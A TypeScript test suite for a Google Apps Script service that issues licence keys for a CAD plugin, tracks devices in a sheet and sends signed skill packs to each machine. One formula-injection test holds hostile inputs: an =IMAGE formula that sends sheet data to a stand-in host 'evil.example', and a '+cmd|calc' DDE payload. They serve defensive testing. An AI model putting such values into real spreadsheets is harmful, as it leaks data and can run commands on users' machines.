/**
 * v0.9.4 activation service + device management (activation/apps-script/Code.gs.template): runs the Google Apps
 * Script in a VM with stand-ins for Utilities / MailApp / CacheService / LockService / ContentService /
 * SpreadsheetApp, the way Google runs it, and checks: the owner gets the key by email, every machine lands in
 * the "Thiết bị" sheet, Active in the sheet activates without a key, Disabled locks the machine, only the right
 * key turns into a licence, and licences / statuses are signed so the plugin (LicenseLogic, same RSA-SHA256
 * PKCS#1 v1.5 + base64url) accepts them.
 */
import assert from 'node:assert/strict';
import crypto from 'node:crypto';
import fs from 'node:fs';
import path from 'node:path';
import vm from 'node:vm';
import { describe, it } from 'node:test';

function findRepoFile(rel: string): string {
  let dir = process.cwd();
  for (let i = 0; i < 6; i++) {
    const p = path.join(dir, rel);
    if (fs.existsSync(p)) return p;
    dir = path.dirname(dir);
  }
  throw new Error('not found: ' + rel);
}

// Apps Script byte[] are Java bytes: -128..127
const javaBytes = (b: Buffer): number[] => Array.from(b, x => (x > 127 ? x - 256 : x));
const toBuf = (a: number[]): Buffer => Buffer.from(a.map(x => x & 0xff));

interface Mail { to: string; subject: string; body: string }

/** One sheet of a fake spreadsheet: a 2D array with the few Range methods the script uses. */
class FakeSheet {
  rows: unknown[][] = [];
  getLastRow() { return this.rows.length; }
  appendRow(r: unknown[]) { this.rows.push([...r]); }
  setFrozenRows(_n: number) {}
  private cell(r: number, c: number): unknown[] {
    while (this.rows.length < r) this.rows.push([]);
    const row = this.rows[r - 1];
    while (row.length < c) row.push('');
    return row;
  }
  getRange(row: number, col: number, numRows = 1, numCols = 1) {
    const sheet = this;
    const range = {
      getValue: () => (sheet.rows[row - 1] ?? [])[col - 1] ?? '',
      getValues: () =>
        Array.from({ length: numRows }, (_, i) =>
          Array.from({ length: numCols }, (_, j) => (sheet.rows[row - 1 + i] ?? [])[col - 1 + j] ?? '')),
      setValue(v: unknown) { sheet.cell(row, col)[col - 1] = v; return range; },
      setValues(vals: unknown[][]) {
        vals.forEach((r, i) => r.forEach((v, j) => { sheet.cell(row + i, col + j)[col - 1 + j] = v; }));
        return range;
      },
      getDisplayValues: () => range.getValues().map(r => r.map(v => String(v))),
      setFontWeight() { return range; },
      setNumberFormat() { return range; },
      setWrap() { return range; },
      setDataValidation() { return range; }, // the dropdown is cosmetic; rowStatus() tolerates any text
    };
    return range;
  }
}

function loadService() {
  const { privateKey, publicKey } = crypto.generateKeyPairSync('rsa', { modulusLength: 2048 });
  const pem = (privateKey.export({ format: 'pem', type: 'pkcs8' }) as string).trim() + '\n';
  const js = (s: string) => s.replace(/\\/g, '\\\\').replace(/'/g, "\\'").replace(/\r?\n/g, '\\n');
  const code = fs.readFileSync(findRepoFile('activation/apps-script/Code.gs.template'), 'utf8')
    .replace('{{EMAIL}}', 'owner@example.com')
    .replace('{{SECRET}}', 'test-secret')
    .replace('{{PRIVATE_KEY}}', js(pem));
  const mails: Mail[] = [];
  const quota = { left: 100 };
  const cache = new Map<string, string>();
  const props = new Map<string, string>();
  const hooks: { onLock?: () => void } = {};
  const sheets = new Map<string, FakeSheet>();
  const spreadsheet = {
    getSheetByName: (n: string) => sheets.get(n) ?? null,
    insertSheet: (n: string) => { const s = new FakeSheet(); sheets.set(n, s); return s; },
  };
  const sandbox: Record<string, unknown> = {
    Utilities: {
      computeHmacSha256Signature: (value: string, key: string) => javaBytes(crypto.createHmac('sha256', key).update(value, 'utf8').digest()),
      computeRsaSha256Signature: (value: string, key: string) => javaBytes(crypto.sign('sha256', Buffer.from(value, 'utf8'), key)),
      base64EncodeWebSafe: (bytes: number[]) => toBuf(bytes).toString('base64').replace(/\+/g, '-').replace(/\//g, '_'),
      formatDate: (d: Date, _tz: string, fmt: string) =>
        fmt === 'yyyy-MM-dd' ? d.toISOString().slice(0, 10)
          : fmt === 'yyyyMMddHH' ? d.toISOString().slice(0, 13).replace(/[-T]/g, '')
            : fmt === 'yyyyMMddHHmmss' ? d.toISOString().slice(0, 19).replace(/[-T:]/g, '') : d.toISOString(),
      DigestAlgorithm: { SHA_256: 'sha256' },
      Charset: { UTF_8: 'utf8' },
      computeDigest: (alg: string, value: string, _cs: string) => javaBytes(crypto.createHash(alg).update(value, 'utf8').digest()),
      newBlob: () => {
        let data = Buffer.alloc(0);
        const blob = { setDataFromString: (t: string) => { data = Buffer.from(t, 'utf8'); return blob; }, getBytes: () => javaBytes(data) };
        return blob;
      },
    },
    MailApp: {
      sendEmail: (to: string, subject: string, body: string) => mails.push({ to, subject, body }),
      getRemainingDailyQuota: () => quota.left - mails.length,
    },
    LockService: { getScriptLock: () => ({ tryLock: () => { hooks.onLock?.(); return true; }, releaseLock: () => {} }) },
    PropertiesService: {
      getScriptProperties: () => ({
        getProperty: (k: string) => props.get(k) ?? null,
        setProperty: (k: string, v: string) => { props.set(k, v); },
        deleteProperty: (k: string) => { props.delete(k); },
        getKeys: () => [...props.keys()],
      }),
    },
    console: { log: () => {} },
    CacheService: { getScriptCache: () => ({ get: (k: string) => cache.get(k) ?? null, put: (k: string, v: string) => cache.set(k, v) }) },
    SpreadsheetApp: {
      getActive: () => spreadsheet,
      getActiveSpreadsheet: () => spreadsheet,
      newDataValidation: () => {
        const b = { requireValueInList: () => b, setAllowInvalid: () => b, build: () => ({}) };
        return b;
      },
    },
    ContentService: {
      MimeType: { JSON: 'json' },
      createTextOutput: (s: string) => ({ content: s, setMimeType() { return this; } }),
    },
    Logger: { log: () => {} },
  };
  vm.createContext(sandbox);
  vm.runInContext(code, sandbox);
  const get = (params: Record<string, string>) =>
    JSON.parse(((sandbox.doGet as (e: unknown) => { content: string })({ parameter: params })).content);
  const sheet = () => sheets.get('Thiết bị');
  const row = (machine: string) => sheet()?.rows.find(r => r[0] === machine);
  return { get, mails, cache, props, hooks, publicKey, sandbox, quota, sheet, row, sheets };
}

const verify = (license: string, key: crypto.KeyObject) => {
  const i = license.lastIndexOf('|');
  return crypto.verify('sha256', Buffer.from(license.slice(0, i), 'utf8'), key, Buffer.from(license.slice(i + 1), 'base64url'));
};

describe('activation service (Apps Script)', () => {
  const machine = 'CC-1A2B-3C4D-5E6F';

  it('emails the owner the device, the Windows user, the machine code and the key', () => {
    const s = loadService();
    const r = s.get({ action: 'request', machine, device: 'LAPTOP-TUAN', user: 'Trường', from: 'setup 0.9.4' });
    assert.deepEqual(r, { ok: true, sent: true });
    assert.equal(s.mails.length, 1);
    const m = s.mails[0];
    assert.equal(m.to, 'owner@example.com');
    assert.match(m.subject, /LAPTOP-TUAN \(Trường\)/);
    assert.match(m.body, /Mã máy: CC-1A2B-3C4D-5E6F/);
    assert.match(m.body, /KEY: [0-9A-HJKMNP-TV-Z]{4}-[0-9A-HJKMNP-TV-Z]{4}-[0-9A-HJKMNP-TV-Z]{4}-[0-9A-HJKMNP-TV-Z]{4}\n/);
    assert.match(m.body, /Trạng thái thành Active/); // the sheet way is in the email too
    // asked again within 30 minutes (Back / Next, palette reopened): no second email
    assert.deepEqual(s.get({ action: 'request', machine, device: 'LAPTOP-TUAN', user: 'x' }), { ok: true, sent: false });
    assert.equal(s.mails.length, 1);
  });

  it('a new machine lands in the "Thiết bị" sheet as Chờ duyệt', () => {
    const s = loadService();
    s.get({ action: 'request', machine, device: 'LAPTOP-TUAN', user: 'Trường' });
    const row = s.row(machine)!;
    assert.ok(row, 'the request must add a row');
    assert.equal(row[1], 'LAPTOP-TUAN');
    assert.equal(row[2], 'Trường');
    assert.ok(String(row[3]).length > 0, 'Ngày xin is filled');
    assert.equal(row[5], 'Chờ duyệt');
    // asking again does not duplicate the row
    s.cache.clear();
    s.get({ action: 'request', machine, device: 'LAPTOP-TUAN', user: 'Trường' });
    assert.equal(s.sheet()!.rows.filter(r => r[0] === machine).length, 1);
  });

  it('the key from the email activates that machine only, and the row becomes Active', () => {
    const s = loadService();
    s.get({ action: 'request', machine, device: 'PC', user: 'u' });
    const key = /KEY: (\S+)/.exec(s.mails[0].body)![1];
    const r = s.get({ action: 'activate', machine, key });
    assert.equal(r.ok, true, r.error);
    assert.match(r.license, /^CCL1\|CC-1A2B-3C4D-5E6F\|\d{4}-\d{2}-\d{2}\|[A-Za-z0-9_-]+$/); // no "=" padding, no quotes
    assert.ok(verify(r.license, s.publicKey));
    assert.match(r.status, /^CCS1\|CC-1A2B-3C4D-5E6F\|active\|\d{4}-\d{2}-\d{2}\|[A-Za-z0-9_-]+$/);
    assert.ok(verify(r.status, s.publicKey));
    const row = s.row(machine)!;
    assert.equal(row[5], 'Active');
    assert.ok(String(row[4]).length > 0, 'Ngày kích hoạt is filled');
    // typed in lower case, with spaces, O for 0 / I or L for 1
    const sloppy = key.toLowerCase().replace(/0/g, 'o').replace(/1/g, 'l').replace(/-/g, ' ');
    assert.equal(s.get({ action: 'activate', machine, key: sloppy }).ok, true);
    // the same key on another machine
    const other = s.get({ action: 'activate', machine: 'CC-9999-9999-9999', key });
    assert.equal(other.ok, false);
    assert.match(other.error, /không đúng/);
    // a made-up key
    assert.equal(s.get({ action: 'activate', machine, key: 'AAAA-BBBB-CCCC-DDDD' }).ok, false);
  });

  it('Active in the sheet activates without a key ("Kiểm tra lại"), and last-use is recorded', () => {
    const s = loadService();
    s.get({ action: 'request', machine, device: 'PC', user: 'u' });
    // not approved yet: signed "pending", no licence
    let r = s.get({ action: 'status', machine, ver: '0.9.4' });
    assert.equal(r.ok, true);
    assert.match(r.status, /^CCS1\|CC-1A2B-3C4D-5E6F\|pending\|\d{4}-\d{2}-\d{2}\|/);
    assert.ok(verify(r.status, s.publicKey));
    assert.equal(r.license, undefined);
    // the owner flips the cell (any letter case, stray spaces): approved
    const row = s.row(machine)!;
    row[5] = '  aCtIve ';
    s.cache.delete('seen:' + machine);
    r = s.get({ action: 'status', machine, ver: '0.9.4' });
    assert.match(r.status, /\|active\|/);
    assert.ok(verify(r.status, s.publicKey));
    assert.ok(verify(r.license, s.publicKey), 'an Active machine gets its licence from ?action=status');
    assert.match(r.license, /^CCL1\|CC-1A2B-3C4D-5E6F\|/);
    assert.ok(String(row[6]).length > 0, 'Lần cuối dùng is filled');
    assert.equal(row[7], '0.9.4');
  });

  it('Disabled blocks request and activate (even with the right key), and status says so', () => {
    const s = loadService();
    s.get({ action: 'request', machine, device: 'PC', user: 'u' });
    const key = /KEY: (\S+)/.exec(s.mails[0].body)![1];
    s.row(machine)![5] = 'Disabled';
    const act = s.get({ action: 'activate', machine, key });
    assert.equal(act.ok, false);
    assert.match(act.error, /tạm khóa/);
    const req = s.get({ action: 'request', machine, device: 'PC', user: 'u' });
    assert.equal(req.ok, false);
    assert.match(req.error, /tạm khóa/);
    assert.equal(s.mails.length, 1); // no begging emails from a disabled machine
    const st = s.get({ action: 'status', machine });
    assert.match(st.status, /^CCS1\|CC-1A2B-3C4D-5E6F\|disabled\|/);
    assert.ok(verify(st.status, s.publicKey));
    assert.equal(st.license, undefined);
  });

  it('at most 30 new machines per hour reach the sheet (made-up codes cannot fill it with junk)', () => {
    const s = loadService();
    const m = (i: number) => `CC-0000-0001-${i.toString(16).toUpperCase().padStart(4, '0')}`;
    for (let i = 1; i <= 30; i++) s.get({ action: 'request', machine: m(i), device: 'x', user: 'y' });
    assert.equal(s.sheet()!.rows.filter(r => String(r[0]).startsWith('CC-0000-0001-')).length, 30);
    assert.equal(s.mails.length, 10); // the email limit still applies on its own
    const r = s.get({ action: 'request', machine: m(31), device: 'x', user: 'y' });
    assert.equal(r.ok, false);
    assert.match(r.error, /quá nhiều máy mới/);
    assert.equal(s.row(m(31)), undefined);
    // a machine already in the sheet may still ask again (no new row)
    s.cache.delete('req:' + m(12));
    assert.doesNotMatch(s.get({ action: 'request', machine: m(12), device: 'x', user: 'y' }).error ?? '', /quá nhiều máy mới/);
    // the next hour the limit starts again
    for (const k of [...s.cache.keys()]) if (k.startsWith('rows:')) s.cache.set(k, '0');
    assert.doesNotMatch(s.get({ action: 'request', machine: m(31), device: 'x', user: 'y' }).error ?? '', /quá nhiều máy mới/);
    assert.ok(s.row(m(31)));
  });

  it('at most 40 request emails a day, counted across hours; old days are forgotten', () => {
    const s = loadService();
    const today = new Date().toISOString().slice(0, 10).replace(/-/g, '');
    s.props.set('mailsDay:20200101', '7'); // a counter of an earlier day
    s.props.set('mailsDay:' + today, '39');
    const m = (i: number) => `CC-0000-0002-${i.toString(16).toUpperCase().padStart(4, '0')}`;
    assert.equal(s.get({ action: 'request', machine: m(1), device: 'x', user: 'y' }).sent, true); // the 40th
    const r = s.get({ action: 'request', machine: m(2), device: 'x', user: 'y' });
    assert.equal(r.ok, false);
    assert.match(r.error, /hết lượt gửi email hôm nay/);
    assert.equal(s.mails.length, 1);
    assert.ok(s.row(m(2)), 'the machine is still in the sheet');
    // the first email of a new day clears the old counters
    const t = loadService();
    t.props.set('mailsDay:20200101', '7');
    t.get({ action: 'request', machine: m(3), device: 'x', user: 'y' });
    assert.equal(t.props.get('mailsDay:20200101'), undefined);
    assert.equal(t.props.get('mailsDay:' + today), '1');
  });

  it('two requests of one machine at the same moment send one email', () => {
    const s = loadService();
    // another request of the same machine finishes while this one waits for the lock
    s.hooks.onLock = () => { s.cache.set('req:' + machine, '1'); };
    const r = s.get({ action: 'request', machine, device: 'PC', user: 'u' });
    assert.deepEqual(r, { ok: true, sent: false });
    assert.equal(s.mails.length, 0);
  });

  it('text from a machine never becomes a formula in the sheet', () => {
    const s = loadService();
    const evil = '=IMAGE("https://evil.example/x?"&A2)';
    s.get({ action: 'request', machine, device: evil, user: '+cmd|calc', from: 'x' });
    const row = s.row(machine)!;
    assert.equal(row[1], "'" + evil);
    assert.equal(row[2], "'+cmd|calc");
    s.cache.clear();
    s.get({ action: 'request', machine, device: '@SUM(A1)', user: '-1+1', from: 'x' }); // refreshed names too
    assert.equal(row[1], "'@SUM(A1)");
    assert.equal(row[2], "'-1+1");
    s.get({ action: 'status', machine, ver: '=HYPERLINK("x")' });
    assert.equal(row[7], "'=HYPERLINK(\"x\")");
    // ordinary names stay as they are
    s.cache.clear();
    s.get({ action: 'request', machine, device: 'LAPTOP-TUAN', user: 'Trường', from: 'x' });
    assert.equal(row[1], 'LAPTOP-TUAN');
  });

  it('an Active machine asking again (licence lost, reinstall) gets no second email', () => {
    const s = loadService();
    s.get({ action: 'request', machine, device: 'PC', user: 'u' });
    s.row(machine)![5] = 'Active';
    s.cache.clear();
    const r = s.get({ action: 'request', machine, device: 'PC', user: 'u' });
    assert.equal(r.ok, true);
    assert.equal(r.sent, false);
    assert.equal(r.approved, true);
    assert.equal(s.mails.length, 1);
    assert.ok(s.get({ action: 'status', machine }).license, 'the licence comes back through ?action=status');
  });

  it('status for an unknown machine is signed "pending" and adds no row', () => {
    const s = loadService();
    const r = s.get({ action: 'status', machine: 'CC-AAAA-BBBB-CCCC' });
    assert.equal(r.ok, true);
    assert.match(r.status, /^CCS1\|CC-AAAA-BBBB-CCCC\|pending\|/);
    assert.ok(verify(r.status, s.publicKey));
    assert.equal(s.row('CC-AAAA-BBBB-CCCC'), undefined);
  });

  it('refuses bad input instead of failing', () => {
    const s = loadService();
    assert.equal(s.get({ action: 'request', machine: 'hello' }).ok, false);
    assert.equal(s.get({ action: 'activate', machine: 'CC-1A2B-3C4D-5E6F', key: '' }).ok, false);
    assert.equal(s.get({ action: 'status', machine: 'hello' }).ok, false);
    assert.equal(s.get({}).ok, false);
    assert.equal(s.get({ action: 'ping' }).ok, true);
    assert.equal(s.mails.length, 0);
  });

  it('keys depend on the secret: another owner\'s service makes other keys', () => {
    const a = loadService();
    const keyA = (a.sandbox.makeKey as (m: string) => string)(machine);
    const code = fs.readFileSync(findRepoFile('activation/apps-script/Code.gs.template'), 'utf8');
    assert.ok(code.includes("var SECRET = '{{SECRET}}'"), 'the template must not carry a real secret');
    assert.ok(code.includes("var PRIVATE_KEY = '{{PRIVATE_KEY}}'"), 'the template must not carry a real private key');
    assert.match(keyA, /^[0-9A-HJKMNP-TV-Z]{4}(-[0-9A-HJKMNP-TV-Z]{4}){3}$/);
  });

  it('the manual function emails the key, the offline code and the no-network pass', () => {
    const s = loadService();
    vm.runInContext("MAY_THU_CONG = 'CC-1A2B-3C4D-5E6F';", s.sandbox);
    (s.sandbox.taoKeyThuCong as () => void)();
    assert.equal(s.mails.length, 1);
    const offline = /\n(CCL1\|\S+)\n/.exec(s.mails[0].body)![1];
    assert.ok(verify(offline, s.publicKey));
    assert.ok(offline.startsWith('CCL1|CC-1A2B-3C4D-5E6F|'));
    const pass = /\n(CCS1\|\S+)\n/.exec(s.mails[0].body)![1];
    assert.ok(verify(pass, s.publicKey));
    assert.ok(pass.startsWith('CCS1|CC-1A2B-3C4D-5E6F|offline|'));
    assert.equal(s.row(machine)![5], 'Active'); // the owner sees the hand-made machine in the sheet too
  });

  it('kiemTra builds the sheet and self-tests the whole loop', () => {
    const s = loadService();
    (s.sandbox.kiemTra as () => void)();
    assert.equal(s.sheet()!.rows[0][0], 'Mã máy'); // headers in place
    assert.equal(s.row('CC-1234-5678-9ABC')![5], 'Active');
    assert.equal(s.mails.length, 1);
    assert.match(s.mails[0].subject, /hoạt động/);
  });

  it('limits request emails: 10 per hour, keeps a few of the daily Gmail quota', () => {
    const s = loadService();
    const m = (i: number) => `CC-0000-0000-${i.toString(16).toUpperCase().padStart(4, '0')}`;
    for (let i = 1; i <= 10; i++) assert.equal(s.get({ action: 'request', machine: m(i), device: 'x', user: 'y' }).sent, true);
    const r = s.get({ action: 'request', machine: m(11), device: 'x', user: 'y' });
    assert.equal(r.ok, false);
    assert.match(r.error, /quá nhiều yêu cầu/i);
    assert.equal(s.mails.length, 10);
    assert.ok(s.row(m(11)), 'the machine is in the sheet even when the email was not sent');
    // daily quota almost used up (another hour)
    const t = loadService();
    t.quota.left = 6;
    assert.equal(t.get({ action: 'request', machine: m(1), device: 'x', user: 'y' }).sent, true);
    const r2 = t.get({ action: 'request', machine: m(2), device: 'x', user: 'y' });
    assert.equal(r2.ok, false);
    assert.match(r2.error, /hết lượt gửi email/);
    // activation of a machine whose key the owner already sent still works
    const key = /KEY: (\S+)/.exec(t.mails[0]!.body)![1];
    assert.equal(t.get({ action: 'activate', machine: m(1), key }).ok, true);
  });
});

// ---------------------------------------------------------------------------------------------- skills per machine

/** The plugin's side of a CCP1 pack (plugin/ClaudeCAD.Plugin/Core/SkillPack.cs), enough to read what was sent. */
function readPack(line: string, key: crypto.KeyObject) {
  const parts = line.split('|');
  assert.equal(parts.length, 5);
  assert.equal(parts[0], 'CCP1');
  assert.ok(verify(line, key), 'pack signature');
  assert.match(parts[2], /^\d{14}$/);
  const body = JSON.parse(Buffer.from(parts[3], 'base64url').toString('utf8')) as {
    v: number; skills: Array<{ name: string; act: string; rev: string; sha256?: string; md?: string }>;
  };
  assert.equal(body.v, 1);
  return { machine: parts[1], issued: parts[2], skills: body.skills };
}

const b64sha = (t: string) => crypto.createHash('sha256').update(t, 'utf8').digest('base64url');
/** SkillPackLogic.Digest */
const digestOf = (skills: Array<{ name: string; act: string; rev: string; sha256?: string }>) =>
  b64sha([...skills].sort((a, b) => (a.name < b.name ? -1 : a.name > b.name ? 1 : 0))
    .map(s => `${s.name}:${s.act}:${s.rev}:${s.act === 'delete' ? '' : s.sha256}\n`).join(''));

const skillMd = (name: string, body = 'Nội dung.') =>
  `---\nname: ${name}\ndescription: Chuẩn vẽ của công ty A - layer, chữ, kích thước. Dùng khi vẽ cho công ty A.\n---\n\n# ${name}\n\n${body}`;

describe('skills per machine (Apps Script, Gán skill)', () => {
  const machine = 'CC-1A2B-3C4D-5E6F';
  const other = 'CC-9999-8888-7777';

  function setup() {
    const s = loadService();
    (s.sandbox.caiDat as () => void)();
    s.get({ action: 'request', machine, device: 'PC', user: 'u' });
    s.get({ action: 'request', machine: other, device: 'PC2', user: 'u2' });
    s.sheet()!.rows.forEach(r => { if (r[0] === machine || r[0] === other) r[5] = 'Active'; });
    const lib = s.sheets.get('Skill')!;
    const assign = s.sheets.get('Gán skill')!;
    return { ...s, lib, assign };
  }

  it('caiDat builds the Skill and Gán skill sheets', () => {
    const s = setup();
    assert.deepEqual(s.lib.rows[0], ['Tên', 'Phiên bản', 'Nội dung SKILL.md', 'Ghi chú']);
    assert.deepEqual(s.assign.rows[0], ['Mã máy', 'Tên skill', 'Hành động', 'Ghi chú']);
  });

  it('an old plugin (no sk) never gets a pack; a machine with nothing assigned gets nothing', () => {
    const s = setup();
    s.lib.appendRow(['cty-a', '1', skillMd('cty-a'), '']);
    s.assign.appendRow([machine, 'cty-a', 'Thêm', '']);
    assert.equal(s.get({ action: 'status', machine }).skills, undefined);
    assert.equal(s.get({ action: 'status', machine: other, sk: '-' }).skills, undefined);
  });

  it('sends the assigned skills signed for that machine only, then nothing while unchanged', () => {
    const s = setup();
    s.lib.appendRow(['cty-a', 3, skillMd('cty-a'), '']);
    s.lib.appendRow(['cty-b', '1', skillMd('cty-b'), '']);
    s.assign.appendRow([machine, 'cty-a', 'Thêm', '']);
    s.assign.appendRow([machine.toLowerCase(), 'cty-b', 'Ẩn', '']);
    s.assign.appendRow([machine, 'cty-old', 'Xóa', '']);
    const r = s.get({ action: 'status', machine, sk: '-' });
    assert.ok(r.status.startsWith('CCS1|' + machine + '|active|'));
    assert.ok(JSON.stringify(r).indexOf('"status":"') < JSON.stringify(r).indexOf('"skills":"'), 'skills after status');
    const p = readPack(r.skills, s.publicKey);
    assert.equal(p.machine, machine);
    assert.deepEqual(p.skills.map(k => [k.name, k.act, k.rev]), [['cty-a', 'add', '3'], ['cty-b', 'hide', '1'], ['cty-old', 'delete', '']]);
    assert.equal(p.skills[0].md, skillMd('cty-a'));
    assert.equal(p.skills[0].sha256, b64sha(skillMd('cty-a')));
    assert.equal(p.skills[2].md, undefined);
    // unchanged: no pack; changed rev: a new pack
    const sk = digestOf(p.skills);
    assert.equal(s.get({ action: 'status', machine, sk }).skills, undefined);
    s.lib.rows[1][1] = '4';
    assert.equal(s.get({ action: 'status', machine, sk }).skills, undefined, 'known up to date: not worked out again for 10 min');
    s.cache.clear();
    assert.ok(s.get({ action: 'status', machine, sk }).skills);
    // the other machine gets nothing of it
    assert.equal(s.get({ action: 'status', machine: other, sk: '-' }).skills, undefined);
  });

  it('digest matches the plugin (fixed vectors in SkillPackTests)', () => {
    const s = setup();
    const digest = s.sandbox.digest as (l: unknown[]) => string;
    assert.equal(digest([]), '47DEQpj8HBSa-_TImW-5JCeuQeRkm5NMpJWZG3hSuFU');
    const list = [{ name: 'b', act: 'delete', rev: '2', sha256: 'ignored' }, { name: 'a', act: 'add', rev: '1', sha256: b64sha('x') }];
    assert.equal(digest(list), digestOf(list));
    assert.equal(digest(list), 'WTqycN8fUlMedhP9nVCTcvC6bt2w0vb44eR7weJPb-w');
  });

  it('only Active machines get skills', () => {
    const s = setup();
    s.lib.appendRow(['cty-a', '1', skillMd('cty-a'), '']);
    s.assign.appendRow([machine, 'cty-a', 'Thêm', '']);
    s.sheet()!.rows.find(r => r[0] === machine)![5] = 'Disabled';
    assert.equal(s.get({ action: 'status', machine, sk: '-' }).skills, undefined);
    s.sheet()!.rows.find(r => r[0] === machine)![5] = 'Chờ duyệt';
    assert.equal(s.get({ action: 'status', machine, sk: '-' }).skills, undefined);
  });

  it('bad rows are left out and explained in Ghi chú; a lower row wins', () => {
    const s = setup();
    s.lib.appendRow(['cty-a', '1', skillMd('cty-a'), '']);
    s.lib.appendRow(['cty-sai', '1', skillMd('cty-khac'), '']);
    s.lib.appendRow(['cty-ngan', '1', '---\nname: cty-ngan\ndescription: ngắn\n---\n', '']);
    s.lib.appendRow(['cty-dai', '1', skillMd('cty-dai', 'x'.repeat(45001)), '']);
    s.lib.appendRow(['=cty', '1', 'x', '']);
    s.assign.appendRow([machine, 'cty-a', 'Ẩn', '']);
    s.assign.appendRow([machine, 'cty-a', 'Thêm', '']); // wins
    s.assign.appendRow([machine, 'khong-co', 'Thêm', '']);
    s.assign.appendRow([machine, 'cty-sai', 'Thêm', '']);
    s.assign.appendRow([machine, 'cty-ngan', 'Thêm', '']);
    s.assign.appendRow([machine, 'cty-dai', 'Thêm', '']);
    s.assign.appendRow([machine, 'Ten Sai', 'Thêm', '']);
    s.assign.appendRow([machine, 'x-admin', 'Thêm', '']);
    s.assign.appendRow([machine, 'cty-a', 'Chạy', '']);
    const p = readPack(s.get({ action: 'status', machine, sk: '-' }).skills, s.publicKey);
    assert.deepEqual(p.skills.map(k => [k.name, k.act]), [['cty-a', 'add']]);
    const note = (i: number) => String(s.assign.rows[i][3]);
    assert.match(note(3), /Không có skill "khong-co"/);
    assert.match(note(4), /name/);
    assert.match(note(5), /description/);
    assert.match(note(6), /45000/);
    assert.match(note(7), /không hợp lệ/);
    assert.match(note(8), /không hợp lệ/);
    assert.match(note(9), /Hành động/);
    assert.match(String(s.lib.rows[5][3]), /^'?Lỗi/); // "=cty": a note, never a formula
    assert.ok(!String(s.lib.rows[5][3]).startsWith('='));
  });

  it('at most 20 skills per machine, the rest noted', () => {
    const s = setup();
    for (let i = 0; i < 22; i++) {
      s.lib.appendRow([`s-${i}`, '1', skillMd(`s-${i}`), '']);
      s.assign.appendRow([machine, `s-${i}`, 'Thêm', '']);
    }
    const p = readPack(s.get({ action: 'status', machine, sk: '-' }).skills, s.publicKey);
    assert.equal(p.skills.length, 20);
    assert.match(String(s.assign.rows[21][3]), /Quá 20/);
  });

  it('works a machine\'s pack out at most once a minute (calls with made-up sk cannot eat the quota)', () => {
    const s = setup();
    s.lib.appendRow(['cty-a', '1', skillMd('cty-a'), '']);
    s.assign.appendRow([machine, 'cty-a', 'Thêm', '']);
    let reads = 0;
    const getRange = s.lib.getRange.bind(s.lib);
    s.lib.getRange = (...a: [number, number, number?, number?]) => { reads++; return getRange(...a); };
    assert.ok(s.get({ action: 'status', machine, sk: '-' }).skills);
    const after = reads;
    for (let i = 0; i < 20; i++) assert.equal(s.get({ action: 'status', machine, sk: 'bia-' + i }).skills, undefined);
    assert.equal(reads, after);
    assert.ok(s.get({ action: 'status', machine }).status, 'status itself still answers');
  });

  it('rejects names Windows cannot use as a folder', () => {
    const s = setup();
    s.lib.appendRow(['con', '1', skillMd('con'), '']);
    s.assign.appendRow([machine, 'con', 'Thêm', '']);
    s.assign.appendRow([machine, 'lpt1', 'Xóa', '']);
    assert.equal(s.get({ action: 'status', machine, sk: '-' }).skills, undefined);
    assert.match(String(s.assign.rows[1][3]), /không hợp lệ/);
    assert.match(String(s.assign.rows[2][3]), /không hợp lệ/);
  });

  it('a machine whose rows were all removed gets one empty pack, then nothing', () => {
    const s = setup();
    s.lib.appendRow(['cty-a', '1', skillMd('cty-a'), '']);
    s.assign.appendRow([machine, 'cty-a', 'Thêm', '']);
    const p = readPack(s.get({ action: 'status', machine, sk: '-' }).skills, s.publicKey);
    s.cache.clear();
    s.assign.rows.splice(1);
    const r = s.get({ action: 'status', machine, sk: digestOf(p.skills) });
    assert.deepEqual(readPack(r.skills, s.publicKey).skills, []);
    assert.equal(s.get({ action: 'status', machine, sk: digestOf([]) }).skills, undefined);
  });
});
